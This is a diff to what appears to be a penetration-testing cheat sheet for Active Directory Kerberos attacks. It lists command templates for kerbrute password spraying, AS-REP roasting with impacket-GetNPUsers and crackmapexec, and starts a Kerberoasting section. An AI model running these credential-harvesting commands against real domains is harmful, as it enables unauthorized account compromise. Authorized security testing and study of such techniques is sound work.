@@ -7,8 +7,8 @@ Check a password for userlist:
 `kerbrute passwordspray --dc <IP> -d <DOMAIN> -v <USERLIST> <PASS>`
 
 AS-REP (AS-REP Roasting):
-`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/ -usersfile <USERLIST>` # --downgrade to get correct hash
-`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request` # --downgrade to get correct hash
+`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/ -usersfile <USERLIST>`
+`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request`
 `crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --asreproast <OUTPUT>`
 
 TGS-REP (Kerberoasting):
